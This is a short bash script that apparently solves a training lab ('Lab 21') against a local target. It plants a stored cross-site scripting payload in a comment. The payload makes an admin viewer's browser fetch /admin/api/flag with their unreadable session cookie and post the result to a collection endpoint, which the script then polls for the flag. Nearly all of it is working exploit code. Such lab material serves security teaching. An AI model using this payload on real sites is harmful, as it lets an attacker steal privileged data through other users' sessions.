#!/usr/bin/env bash
# Lab 21 — the cookie is unreadable and still attached to every fetch, so ask
# the application instead of the browser.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9210}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab21
ID="drop$$"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

PAYLOAD="<script>fetch('/admin/api/flag').then(r=>r.text()).then(t=>fetch('/collect?id=$ID&c='+encodeURIComponent(t)))</script>"

send "$SESSION" req_0 --create --set method=POST --set path=/api/comment \
    --set header.Content-Type=application/json \
    --set json.who=anon --set "json.body=$PAYLOAD" \
    --set "header.X-Board-Url=$URL/board" >/dev/null

for _ in $(seq 1 30); do
    OUT="$(send "$SESSION" req_0 --create --set path=/collected --set "query.id=$ID" | body |
        python3 -c 'import json,sys,urllib.parse
print(" ".join(urllib.parse.unquote(r) for r in json.load(sys.stdin)["rows"]))')"
    [ -n "$OUT" ] && { printf '%s\n' "$OUT" | flag; exit 0; }
    sleep 1
done
echo "no flag found"
